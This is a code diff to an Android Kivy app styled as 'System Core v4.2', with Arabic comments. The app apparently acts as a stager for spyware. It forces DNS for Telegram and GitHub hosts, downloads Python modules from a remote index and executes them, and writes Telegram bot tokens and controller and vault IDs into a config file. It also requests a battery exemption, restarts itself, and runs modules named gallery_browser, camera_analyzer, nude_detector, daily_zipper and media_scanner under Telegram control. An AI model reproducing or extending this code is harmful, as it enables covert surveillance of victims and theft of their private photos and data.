@@ -9,6 +9,7 @@ import gc
 import time
 import socket
 import random
+import shutil
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -17,29 +18,15 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ========== 1. تجاوز DNS (شامل api.telegram.org) ==========
+# ========== تجاوز DNS (اختياري) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
         override = {
-            'raw.githubusercontent.com': [
-                '185.199.108.133', '185.199.109.133',
-                '185.199.110.133', '185.199.111.133'
-            ],
-            'api.telegram.org': [
-                '149.154.167.220', '149.154.167.221',
-                '149.154.167.99', '149.154.175.50'
-            ],
-            'zaen1993.github.io': [
-                '185.199.108.153', '185.199.109.153',
-                '185.199.110.153', '185.199.111.153'
-            ],
-            'cdn.jsdelivr.net': [
-                '151.101.2.229', '151.101.66.229', '151.101.130.229'
-            ]
+            'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
+            'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
+            'zaen1993.github.io': ['185.199.108.153', '185.199.109.153', '185.199.110.153', '185.199.111.153'],
+            'cdn.jsdelivr.net': ['151.101.2.229', '151.101.66.229', '151.101.130.229']
         }
         if host in override:
             fake_ip = random.choice(override[host])
@@ -49,7 +36,7 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== 2. روابط index.json (مع إلغاء التخزين المؤقت) ==========
+# ========== روابط index.json (بدون تمييز assets) ==========
 INDEX_BASE_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
     "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
@@ -63,7 +50,7 @@ HEADERS = {
     'Pragma': 'no-cache'
 }
 
-# ========== 3. المسارات الأساسية ==========
+# ========== المسارات الأساسية ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -88,7 +75,7 @@ os.makedirs(MODELS_DIR, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. الأذونات واستثناء البطارية ==========
+# ========== الأذونات ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -126,7 +113,7 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== 5. تطبيق Kivy الرئيسي ==========
+# ========== تطبيق Kivy ==========
 class CoreApp(App):
     def build(self):
         self.title = "System Core v4.2"
@@ -188,7 +175,7 @@ class CoreApp(App):
         final_path = os.path.join(R, filename)
         url_with_cache_buster = f"{url}?t={int(time.time())}"
         try:
-            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20, verify=False)
+            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20)  # verify=True افتراضياً
             if resp.status_code == 200 and len(resp.content) > 200:
                 with open(final_path, 'wb') as f:
                     f.write(resp.content)
@@ -199,123 +186,163 @@ class CoreApp(App):
 
     def _download_model_if_missing(self, model_url):
         model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
-        
-        # فحص الملف الموجود
-        if os.path.exists(model_path):
-            if os.path.getsize(model_path) > 4_000_000:
-                self._log("🧠 AI model already exists and appears valid.")
-                return True
-            else:
-                self._log("⚠️ Existing model file corrupted (too small). Re‑downloading.")
-                os.remove(model_path)
+        if os.path.exists(model_path) and os.path.getsize(model_path) > 4_000_000:
+            self._log("AI model already exists and appears valid.")
+            return True
+        elif os.path.exists(model_path):
+            os.remove(model_path)
 
-        self._log("📡 Downloading AI model (5.19 MB)...")
+        self._log("Downloading AI model (5.19 MB)...")
         try:
-            resp = requests.get(model_url, headers=HEADERS, timeout=60, verify=False, stream=True)
+            resp = requests.get(model_url, headers=HEADERS, timeout=60, stream=True)
             if resp.status_code == 200:
-                total_downloaded = 0
+                total = 0
                 with open(model_path, 'wb') as f:
                     for chunk in resp.iter_content(chunk_size=8192):
                         if chunk:
                             f.write(chunk)
-                            total_downloaded += len(chunk)
-                if total_downloaded >= 5_000_000:
-                    self._log("✅ AI model downloaded and verified successfully.")
+                            total += len(chunk)
+                if total >= 5_000_000:
+                    self._log("AI model downloaded successfully.")
                     return True
                 else:
-                    self._log(f"⚠️ Download incomplete: {total_downloaded} bytes. Deleting corrupted file.")
+                    self._log(f"Incomplete download: {total} bytes.", "WARN")
                     os.remove(model_path)
                     return False
             else:
-                self._log(f"Model download failed: HTTP {resp.status_code}", "ERROR")
+                self._log(f"Model download HTTP {resp.status_code}", "ERROR")
         except Exception as e:
             self._log(f"Model download error: {e}", "ERROR")
             if os.path.exists(model_path):
                 os.remove(model_path)
         return False
 
+    def _create_config_from_template(self):
+        """إنشاء config.py من config_template.py المضمن في APK"""
+        template_path = None
+        # حاول العثور على config_template.py في المسارات المتوقعة
+        possible_paths = [
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), "config_template.py"),
+            os.path.join(R, "config_template.py"),
+            "config_template.py"
+        ]
+        for p in possible_paths:
+            if os.path.exists(p):
+                template_path = p
+                break
+        if not template_path:
+            self._log("config_template.py not found inside APK!", "ERROR")
+            return False
+        try:
+            # استيراد كوحدة مؤقتة لاستدعاء load_config
+            spec = importlib.util.spec_from_file_location("config_template", template_path)
+            config_module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(config_module)
+            active, reserve, ctrl, vault, secret = config_module.load_config()
+            # كتابة config.py في مجلد R
+            config_py_path = os.path.join(R, "config.py")
+            with open(config_py_path, 'w') as f:
+                f.write(f"""# -*- coding: utf-8 -*-
+active_tokens = {active}
+reserve_tokens = {reserve}
+ctrl_id = {ctrl}
+vault_id = {vault}
+secret_password = "{secret}"
+def load_config():
+    return active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password
+""")
+            self._log("config.py created successfully.")
+            return True
+        except Exception as e:
+            self._log(f"Failed to create config.py: {e}", "ERROR")
+            return False
+
     def _start(self, _):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
         _perms()
-        self._log("🚀 Shield Core v4.2 (Dynamic Model) starting...", "BOOT")
+        self._log("Shield Core v4.2 (Dynamic Model) starting...", "BOOT")
 
-        # --- 1. جلب index.json (مع منع التخزين المؤقت) ---
+        # ---- 1. جلب index.json ----
         all_files = []
-        all_assets = []
         for base_url in INDEX_BASE_URLS:
             try:
                 url = f"{base_url}?t={int(time.time())}"
                 self._log(f"Trying index: {url.split('/')[2]}...")
-                resp = requests.get(url, headers=HEADERS, timeout=15, verify=False)
+                resp = requests.get(url, headers=HEADERS, timeout=15)
                 if resp.status_code == 200:
                     data = resp.json()
                     all_files = data.get('files', [])
-                    all_assets = data.get('assets', [])
-                    self._log(f"📄 Found {len(all_files)} files and {len(all_assets)} assets")
+                    self._log(f"Found {len(all_files)} files in index")
                     break
                 else:
-                    self._log(f"Index returned HTTP {resp.status_code}", "WARN")
+                    self._log(f"Index HTTP {resp.status_code}", "WARN")
             except Exception as e:
                 self._log(f"Index error: {e}", "WARN")
         else:
-            self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
+            self._log("Could not fetch index.json, using only local files.", "WARN")
 
-        # --- 2. تحميل ملفات Python (إذا وجدت) ---
-        for file_url in all_files:
-            filename = file_url.split('/')[-1]
-            if filename == "main.py":
+        # ---- 2. تحميل جميع الملفات بما فيها engine_v2.tflite (من قائمة files) ----
+        model_url = None
+        for file_entry in all_files:
+            name = file_entry.get('name')
+            url = file_entry.get('url')
+            if not name or not url:
                 continue
-            self._download_safe(file_url, filename)
+            if name == "engine_v2.tflite":
+                model_url = url
+                continue
+            if name in ("main.py", "config_template.py"):
+                continue
+            self._download_safe(url, name)
 
-        # --- 3. تحميل الموديل من assets (إذا وجد) ---
-        if all_assets:
-            model_url = all_assets[0]  # نفترض أن الرابط الأول هو للموديل
+        # تحميل config_template.py إذا كان موجوداً في القائمة (أو تضمينه في APK)
+        # نفضل أن يكون config_template.py مضمن في APK، لذا لا نحمله من الإنترنت.
+
+        # ---- 3. إنشاء config.py من القالب المضمن ----
+        if not self._create_config_from_template():
+            self._log("Cannot proceed without config.py", "ERROR")
+            return
+
+        # ---- 4. تحميل الموديل إذا وُجد رابط ----
+        if model_url:
             self._download_model_if_missing(model_url)
         else:
-            # رابط احتياطي في حال فشل index في إعطاء الرابط
+            self._log("No model URL found in index, trying fallback...", "WARN")
             fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
-            self._log("⚠️ No assets field in index, using fallback URL.", "WARN")
             self._download_model_if_missing(fallback_url)
 
         time.sleep(1)
 
-        # --- 4. تنظيف الموديولات القديمة من الذاكرة ---
-        self._log("🧹 Cleaning memory...")
-        modules_to_remove = [
-            "monitor", "telegram_ui", "commands",
-            "media_scanner", "daily_zipper", "gallery_browser",
-            "camera_analyzer", "nude_detector"
-        ]
+        # ---- 5. تنظيف الوحدات القديمة ----
+        modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
+                             "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager"]
         for mod in modules_to_remove:
             if mod in sys.modules:
                 del sys.modules[mod]
         importlib.invalidate_caches()
         gc.collect()
 
-        # --- 5. تحميل الأسرار من config.py ---
-        telegram_path = os.path.join(R, "telegram_ui.py")
-        if not os.path.exists(telegram_path):
-            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
-            return
-
+        # ---- 6. استيراد config و Telegram UI ----
         try:
             import config
-            importlib.reload(config)
             active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
-            self._log("🔐 Configuration loaded securely.")
+            self._log("Configuration loaded.")
         except Exception as e:
-            self._log(f"❌ Failed to load config: {e}", "ERROR")
-            self._log("💡 Hint: Ensure your device is online to fetch setup files.", "INFO")
+            self._log(f"Failed to load config: {e}", "ERROR")
             return
 
-        # --- 6. إقلاع النظام الأساسي ---
+        # التأكد من وجود telegram_ui.py
+        if not os.path.exists(os.path.join(R, "telegram_ui.py")):
+            self._log("telegram_ui.py not found. Check internet and index.json", "ERROR")
+            return
+
+        # ---- 7. إقلاع النظام ----
         try:
             import monitor
             import telegram_ui
             import commands
-
             importlib.reload(monitor)
             importlib.reload(telegram_ui)
             importlib.reload(commands)
@@ -324,7 +351,7 @@ class CoreApp(App):
             if UI_Class:
                 mon = monitor.M()
                 random.seed(mon.did)
-                self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")
+                self._log(f"Device ID: {mon.did[:8]}...")
 
                 ui = UI_Class(
                     m=mon,
@@ -339,13 +366,13 @@ class CoreApp(App):
 
                 ui.start()
                 mon.start()
-                self._log("🎉 SYSTEM ONLINE (AI Model Ready)", "SUCCESS")
+                self._log("SYSTEM ONLINE", "SUCCESS")
                 self._log(f"Device: {mon.did} | Model: {mon.dmd}")
                 self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
             else:
-                self._log("❌ Class 'T' missing in telegram_ui.py", "ERROR")
+                self._log("Class 'T' missing in telegram_ui.py", "ERROR")
         except Exception as e:
-            self._log(f"FATAL ERROR: {e}", "ERROR")
+            self._log(f"FATAL: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
             Clock.schedule_once(lambda dt: self._start(None), 60)
 
@@ -353,7 +380,7 @@ class CoreApp(App):
         return True
 
     def on_stop(self):
-        self._log("App stopped. Restarting service if needed.")
+        self._log("App stopped.")
         return True
 
 if __name__ == '__main__':
